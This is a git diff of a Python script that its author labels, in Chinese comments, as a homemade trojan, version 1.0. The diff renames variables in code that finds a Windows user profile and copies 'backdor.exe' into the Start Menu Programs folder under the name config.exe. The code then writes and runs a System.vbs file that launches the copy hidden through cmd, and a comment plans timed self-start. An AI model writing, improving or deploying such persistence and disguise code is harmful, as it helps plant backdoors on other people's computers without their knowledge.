@@ -5,39 +5,39 @@ import shutil
 #检测路径是否存在
 #我的pyhton木马1.0版本 问题和毛病有很多  欢迎联系我交流: wx：heihuang404
 def search_user():
-    a=os.listdir("c:\\Users")
+    file_dir=os.listdir("c:\\Users")
     #被排除的路径
-    b=['All Users', 'Default', 'Default User', 'DefaultAppPool', 'defaultuser100000', 'desktop.ini', 'Public']
-    for i in range(0,len(a)):
-        if a[i] not in b :
-            c=os.listdir('c:\\Users\\'+a[i])
+    path=['All Users', 'Default', 'Default User', 'DefaultAppPool', 'defaultuser100000', 'desktop.ini', 'Public']
+    for i in range(0,len(file_dir)):
+        if file_dir[i] not in path :
+            c=os.listdir('c:\\Users\\'+file_dir[i])
             for j in range(0,len(c)):
                 #用于标识
                 if c[j] != 'MicrosoftEdgeBackups':
                     continue
                 else:
-                    return a[i].encode('utf-8')
+                    return file_dir[i].encode('utf-8')
 
-a="C:\\Users\\"+search_user().decode('utf-8')+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\" #Startup\\
-if "config.exe" not in os.listdir(a):
+file_dir="C:\\Users\\"+search_user().decode('utf-8')+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\" #Startup\\
+if "config.exe" not in os.listdir(file_dir):
     #自我复制
-    shutil.copy('backdor.exe', a+'config.exe')
+    shutil.copy('backdor.exe', file_dir+'config.exe')
     #自我复制
     # with open("BackDor.exe", 'rb') as rstream:
     #     conn = rstream.read()
-    #     with open(a + 'config.exe', 'wb') as wstream:
+    #     with open(file_dir + 'config.exe', 'wb') as wstream:
     #         wstream.write(conn)
     #     wstream.close()
     # rstream.close()
     #创建vbs文件
-    a=open("C:\\Users\\"+search_user().decode('utf-8')+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System.vbs",'w')
-    a.write('Set ws = createObject("WScript.shell")\nws.run "cmd /c config.exe",vbhide')
-    a.close()
+    vbs_file=open("C:\\Users\\"+search_user().decode('utf-8')+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System.vbs",'w')
+    vbs_file.write('Set ws = createObject("WScript.shell")\nws.run "cmd /c config.exe",vbhide')
+    vbs_file.close()
     #切换目录并打开vbs文件
     os.chdir("C:\\Users\\"+search_user().decode('utf-8')+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\")
     os.system(".\System.vbs")
     exit()
-elif "Microsoft.vbs" not in os.listdir(a):
+elif "Microsoft.vbs" not in os.listdir(file_dir):
     #让自己能定时启动
     pass
 conn=1
